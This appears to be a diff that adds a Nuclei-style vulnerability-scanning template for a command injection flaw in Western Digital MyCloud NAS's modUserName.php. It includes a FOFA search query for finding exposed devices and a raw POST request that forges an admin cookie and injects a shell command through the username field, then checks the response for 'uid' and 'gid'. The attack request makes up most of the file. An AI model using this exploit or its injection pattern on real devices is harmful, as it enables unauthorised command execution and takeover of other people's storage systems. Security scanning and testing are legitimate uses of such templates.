@@ -1,0 +1,32 @@
+id: westcn-modusername-command-exec
+
+info:
+  name: "Western Digital MyCloud NAS modUserName.php 远程命令执行漏洞"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: FOFA:icon_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"
+        Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。该设备通过modUserName.php组件处理用户身份信息时，未正确验证用户输入参数，导致攻击者可构造恶意请求在目标系统上执行任意命令。成功利用该漏洞可实现后门植入、权限提升及对整个Web服务的完全控制。
+  tags: Western-Digital-MyCloud
+
+http:
+- raw:
+  - |
+    POST /web/php/modUserName.php HTTP/1.1
+    Host: {{Hostname}}
+    Cookie: username=test; isAdmin=1
+    Content-Type: application/x-www-form-urlencoded
+
+    oldName=someuser&username=newuser"; id; #
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'uid'
+  - type: word
+    part: body
+    words:
+    - 'gid'
